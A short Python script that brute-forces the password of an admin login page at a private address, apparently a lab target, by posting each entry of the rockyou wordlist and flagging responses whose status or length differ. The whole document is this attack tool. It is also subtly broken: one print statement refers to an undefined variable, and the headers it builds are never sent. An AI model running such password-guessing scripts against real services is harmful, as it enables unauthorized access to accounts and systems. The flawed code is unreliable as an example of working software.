import requests

endpoint = "http://10.129.194.190/admin/index.php?login"
parameter = "pw"

f = open("./../../lists/rockyou.txt", "r")

for line in f:
    password = line.strip()
    params = {parameter: password}
    headers = {'User-Agent': 'My User Agent 1.0'}
    r = requests.post(url=endpoint, params=params)

    if r.status_code != 200:
        print("Found something: ", password, status_code)
    
    if len(r.content) != 14728:
        print("Found something: ", password, len(r.content))